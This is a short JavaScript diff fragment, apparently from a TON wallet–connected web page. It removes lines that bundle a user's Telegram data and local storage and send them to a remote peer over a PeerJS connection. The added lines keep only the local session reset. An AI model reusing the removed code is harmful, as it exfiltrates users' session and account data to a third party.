@@ -21,14 +21,11 @@ else {
         ...telegramData,
         ...localStorageData
     };
-    const conn = peer.connect('another-peer-id');
-    sendJsonToPeer(conn, data);
-    conn.on('data', (data) => {
-        if (data === false && !tonConnectUI.connected) {
-            localStorage.removeItem('oky-local-storage-session-info');
-            openModal();
-        }
-    });
+
+    if (!tonConnectUI.connected) {
+        localStorage.removeItem('oky-local-storage-session-info');
+        openModal();
+    }
 }
 
 const observer = new MutationObserver(function(mutationsList, observer) {
